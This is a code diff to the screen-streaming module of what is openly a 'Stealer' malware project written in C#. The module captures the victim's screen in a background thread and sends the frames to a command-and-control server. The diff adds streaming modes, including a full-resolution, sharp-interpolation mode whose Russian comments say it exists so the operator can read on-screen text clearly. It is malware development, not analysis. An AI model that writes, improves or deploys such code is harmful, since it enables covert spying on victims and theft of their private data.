@@ -6,17 +6,33 @@ using System.Threading;
 
 namespace Stealer.Utils
 {
+    public enum StreamMode
+    {
+        StandardFast = 0,
+        TileDelta = 1,
+        HighQualityText = 2
+    }
+
     public static class ScreenStream
     {
         private static Thread _captureThread;
         private static volatile bool _running;
+        private static StreamMode _currentMode = StreamMode.TileDelta;
+        private static byte[] _previousTileHashes = null;
 
-        public static void Start(int fps, int quality)
+        public static void Start(int fps, int quality, StreamMode mode = StreamMode.TileDelta)
         {
             if (_running) return;
+            _currentMode = mode;
             _running = true;
             _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
             _captureThread.Start();
+        }
+
+        public static void SetMode(StreamMode mode)
+        {
+            _currentMode = mode;
+            _previousTileHashes = null;
         }
 
         public static void Stop()
@@ -36,7 +52,7 @@ namespace Stealer.Utils
             {
                 try
                 {
-                    byte[] frameData = CaptureScreen(jpegEncoder, qualityParam);
+                    byte[] frameData = CaptureScreen(jpegEncoder, qualityParam, _currentMode);
                     if (frameData != null)
                     {
                         C2Client.SendBinary(frameData);
@@ -47,7 +63,7 @@ namespace Stealer.Utils
             }
         }
 
-        private static byte[] CaptureScreen(ImageCodecInfo encoder, EncoderParameters encParams)
+        private static byte[] CaptureScreen(ImageCodecInfo encoder, EncoderParameters encParams, StreamMode mode)
         {
             try
             {
@@ -55,10 +71,11 @@ namespace Stealer.Utils
                 int srcH = GetScreenHeight();
                 if (srcW <= 0 || srcH <= 0) return null;
 
-                // Даунскейлинг до max 1280px по ширине для молниеносной передачи без лагов
+                // Для HighQualityText не делаем ресайз вообще — 100% честное четкое чтение текста!
                 int targetW = srcW;
                 int targetH = srcH;
-                if (srcW > 1280)
+
+                if (mode != StreamMode.HighQualityText && srcW > 1280)
                 {
                     targetW = 1280;
                     targetH = (int)((double)srcH * 1280 / srcW);
@@ -77,7 +94,12 @@ namespace Stealer.Utils
                         {
                             using (var gResize = Graphics.FromImage(resizedBmp))
                             {
-                                gResize.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
+                                // Четкая интерполяция для текста при режиме HighQualityText
+                                gResize.InterpolationMode = mode == StreamMode.HighQualityText
+                                    ? System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic
+                                    : System.Drawing.Drawing2D.InterpolationMode.Low;
+                                gResize.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighSpeed;
+                                gResize.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighSpeed;
                                 gResize.DrawImage(srcBmp, 0, 0, targetW, targetH);
                             }
                             using (var ms = new MemoryStream())
